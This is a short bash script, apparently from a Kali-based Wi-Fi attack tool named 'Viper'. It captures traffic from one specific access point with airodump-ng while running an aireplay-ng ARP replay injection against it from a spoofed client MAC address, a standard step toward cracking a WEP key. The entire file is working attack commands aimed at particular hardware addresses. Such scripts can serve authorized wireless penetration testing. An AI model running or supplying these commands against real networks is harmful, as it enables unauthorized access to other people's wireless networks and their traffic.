#!/bin/bash

timeout 10 airodump-ng --bssid 70:72:3C:C5:55:F3 --channel 6 --write /home/kali/Viper/results/pcapfile wlan0 1>/dev/null 2>/dev/null &
timeout 10 aireplay-ng -3 -b 70:72:3C:C5:55:F3 -h D0:37:45:7B:1F:85 wlan0 1>/dev/null 2>/dev/null &
wait